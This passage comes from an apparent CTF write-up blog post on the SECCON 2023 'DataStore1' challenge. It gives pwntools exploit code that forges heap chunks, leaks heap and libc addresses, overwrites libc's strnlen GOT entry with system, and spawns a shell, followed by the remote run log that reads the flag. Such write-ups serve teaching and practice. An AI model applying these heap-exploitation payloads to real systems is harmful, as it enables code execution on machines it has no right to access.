<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c019</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c0e9</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000000003e8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x680</span><span class="p">)</span>      <span class="c1"># pointer to fake chunk
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000561</span><span class="p">)</span>  <span class="c1"># fake size 0x560
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>  <span class="c1"># fake chunk
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>

<span class="n">updatestring</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">delete</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">3</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555559660:	0x0000000000000000	0x0000000000000021
0x555555559670:	0x00000000000003e8	0x0000555555559680
0x555555559680:	0x0000000000000000	0x0000000000000561
0x555555559690:	0x00007ffff7facce0	0x00007ffff7facce0 &lt;= freed fake chunk
0x5555555596a0:	0x0000000000000000	0x0000000000000000
0x5555555596b0:	0x000055500000c300	0x9c9b8239fefaf274
0x5555555596c0:	0x0000000000000000	0x0000000000000000
0x5555555596d0:	0x0000000000000000	0x0000000000000000
0x5555555596e0:	0x0000000000000000	0x0000000000000000
0x5555555596f0:	0x0000000000000000	0x0000000000000021
0x555555559700:	0x000055500000cea9	0x9c9b8239fefaf274</code></pre></figure>

<p>Having a <code class="language-plaintext highlighter-rouge">main_arena</code> pointer on the heap, let’s overwrite that string again to point to the leak, so we can read it.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Update string pointer again"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>            
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c019</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c0e9</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000000003e8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x690</span><span class="p">)</span>     <span class="o">&lt;=</span> <span class="n">string</span> <span class="n">pointer</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">main_arena</span>

<span class="n">updatestring</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Get libc leak"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[02] &lt;S&gt; "</span><span class="p">)</span>
<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>

<p>Now we’re able to access <code class="language-plaintext highlighter-rouge">libc</code>, so let’s change the string pointer once again to point it into <code class="language-plaintext highlighter-rouge">abs.got</code> area of libc and overwrite <code class="language-plaintext highlighter-rouge">strnlen.got</code> with <code class="language-plaintext highlighter-rouge">system</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>                  <span class="o">&lt;=</span> <span class="n">first</span> <span class="n">string</span> <span class="n">content</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c019</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000055500000c0e9</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x35c09eb735c664b5</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000021</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000000003e8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x219018</span><span class="p">)</span>  <span class="o">&lt;=</span> <span class="n">point</span> <span class="n">to</span> <span class="nb">abs</span><span class="p">.</span><span class="n">got</span>

<span class="n">updatestring</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">updatestring</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span></code></pre></figure>

<p>Also note, that I’ve put <code class="language-plaintext highlighter-rouge">/bin/sh</code> into our first string pointer content. When showing the list of strings again, this will make the binary calling <code class="language-plaintext highlighter-rouge">strnlen(string)</code> and since we overwrote abs.got for <code class="language-plaintext highlighter-rouge">strnlen</code> with system, it will call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># trigger shell
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span></code></pre></figure>

<p>Though the challenge itself was quite fun in hindsight, putting a 30 second timeout on the remote system wasn’t really a nice move for people outside of Japan :(</p>

<p>Had to spin up an <code class="language-plaintext highlighter-rouge">aws</code> instance in Tokyo to be able to execute the exploit fast enough on remote, but that landed the shell finally.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/ubuntu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to datastore1.seccon.games on port 4585: Done
[*] Create initial array
[*] Create sub arrays
[*] Overwrite array size
[*] Create array and leak heap address from it
[*] HEAP leak     : 0x556da5a40470
[*] HEAP base     : 0x556da5a40000
[*] Create strings on heap
[*] Overwrite string pointer
[*] Fillup heap
[*] Update string ptr again
[*] Update string ptr 3
[*] Get libc leak
[*] LIBC leak     : 0x7ff709979ce0
[*] LIBC          : 0x7ff709760000
[*] Switching to interactive mode

Current: &lt;ARRAY(4)&gt;
[00] &lt;EMPTY&gt;
[01] $ ls
chall
flag-02cf8c730391ace954cb5255d37e5c8b.txt
run.sh
$ cat flag-02cf8c730391ace954cb5255d37e5c8b.txt
SECCON{'un10n'_15_4_m4g1c_b0x}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=SECCON CTF 2023 Quals - DataStore1&amp;url=https://kileak.github.io/ctf/2023/secconquals23-datastore1/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2023/secconquals23-datastore1/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2023/secconquals23-datastore1';
        var disqus_title = 'SECCON CTF 2023 Quals - DataStore1';
        var disqus_url = 'https://kileak.github.io/ctf/2023/secconquals23-datastore1';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
